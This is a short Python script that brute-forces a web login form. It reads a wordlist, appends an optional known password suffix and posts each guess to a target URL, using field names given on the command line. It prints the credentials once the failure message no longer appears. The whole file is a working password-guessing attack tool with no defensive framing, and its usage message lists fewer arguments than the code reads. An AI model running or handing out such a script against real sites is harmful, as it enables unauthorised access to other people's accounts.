import requests
import sys

try:
    #sys.argv is the placeholder for the inputs
    filePath = sys.argv[1] #File path way
    username = sys.argv[2] #Login username
    lastPassword = sys.argv[3] #This if you know the last parts of the password for example {wordlist}{lastPassword}
    url = sys.argv[4] #This is the url page that the login should be brute-forced
    cUsername = str(sys.argv[5]) #This is the username credential variable on the html page
    cPassword = str(sys.argv[6]) #This is the password credential variable on the html page
    cLogin = str(sys.argv[7]) #This is the login button credential variable on the html page
    failsMsg = str(sys.argv[8]) #This is the message that will popup if the password is incorrect

    if lastPassword == "-n":
        lastPassword = ""

    #Tries to brute-force password with a wordlist
    with open(filePath, 'r', encoding='latin-1') as wordList:
        for word in wordList:
            word = word.strip()

            password = word + lastPassword

            credentials = {
                f"{cUsername}":f"{username}",
                f"{cPassword}":f"{password}",
                f"{cLogin}":"Login"
        }

            request = requests.post(url, data = credentials)

            try:
                if request.text.find(f"{failsMsg}") == -1:
                    print("")
                    print("-------------------------------------")
                    print("")
                    print("     --- Found login details ---")
                    print("")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print("")
                    print("-------------------------------------")
                    print("")
                    break
                else:
                    print(f"Trying: {password}")
            except:
                print("Login failed")
                break

except:
    print("Syntax: (file path) (Username) (last known Password, '-n' = Nothing) (url) '(Login fail msg)'")
